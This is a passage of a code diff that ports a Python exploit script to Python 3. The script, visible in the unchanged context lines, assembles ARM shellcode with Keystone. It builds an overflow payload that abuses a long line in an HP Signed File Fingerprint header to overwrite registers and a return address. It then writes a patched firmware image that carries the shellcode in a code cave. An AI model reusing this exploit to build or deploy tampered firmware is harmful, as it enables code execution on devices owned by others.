@@ -72,15 +72,15 @@ ADD R7, R7, #0x10000
 BX  R7
 """
 
-print "[+] compiling shellcode body"
+print("[+] compiling shellcode body")
 ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
 sc_body = ''.join(chr(x) for x in ks.asm(asm_shellcode)[0])
 sc_body_len = len(sc_body)
 
 if (sc_body_len > 0x100):
-    print "[x] code cave too short for sc_body (0x%x)" % sc_body_len
+    print("[x] code cave too short for sc_body (0x%x)" % sc_body_len)
 
-print "> sc_body size: 0x%x" % sc_body_len
+print("> sc_body size: 0x%x" % sc_body_len)
 
 # pad up to 0x100 bytes
 sc_body += "\x00" * (0x100-sc_body_len)
@@ -90,7 +90,7 @@ sc_body += "\x00" * (0x100-sc_body_len)
 # setup shellcode trampoline in HP Signed File header
 # - abuse long line
 
-print "[+] compiling trampoline"
+print("[+] compiling trampoline")
 
 nop_ins = ''.join(chr(x) for x in ks.asm("SUBPL    r3, r1, #56")[0])
 bad_reg = "BEEF"
@@ -107,7 +107,7 @@ payload += bad_reg * 6 # R5-R8,R10,R11
 payload += ret_addr
 payload += "\n"
 
-print "> payload size: 0x%x" % len(payload)
+print("> payload size: 0x%x" % len(payload))
 
 
 skel = """--=</Begin HP Signed File Fingerprint\>=--
@@ -120,25 +120,25 @@ Fingerprint Length: 000880
 --=</End HP Signed File Fingerprint\>=--
 """ % payload[:-1]
 
-print "> HP Signed File skel size: 0x%x" % len(skel)
+print("> HP Signed File skel size: 0x%x" % len(skel))
 
 
 with open(INPUT_FILE, 'rb') as fdin:
     fw = fdin.read()
-    print "> input firmware size: 0x%x" % len(fw)
+    print("> input firmware size: 0x%x" % len(fw))
 
     offsetb = fw.find('--=</End HP Signed File Fingerprint\>=--')
     if (offsetb == -1):
-        print "> End of block not found"
+        print("> End of block not found")
         sys.exit(-1)
     offsetb += len('--=</End HP Signed File Fingerprint\>=--\n')
 
     offset_hpimg = fw.find('HPIMAGE')
     if (offset_hpimg == -1):
-        print "> HPIMAGE blob not found"
+        print("> HPIMAGE blob not found")
         sys.exit(-1)
 
-    print "> HPIMAGE blob at offset: 0x%x" % offset_hpimg
+    print("> HPIMAGE blob at offset: 0x%x" % offset_hpimg)
     hpimage = fw[offset_hpimg::]
     #certifs = fw[offsetb:offset_hpimg]
 
@@ -152,6 +152,6 @@ with open(INPUT_FILE, 'rb') as fdin:
         fdout.write(sc_body)
         fdout.write(hpimage[0x200::])
 
-        print "> output firmware size: 0x%x" % fdout.tell()
+        print("> output firmware size: 0x%x" % fdout.tell())
 
-print "\n[+] may the force be with your payload!"
+print("\n[+] may the force be with your payload!")
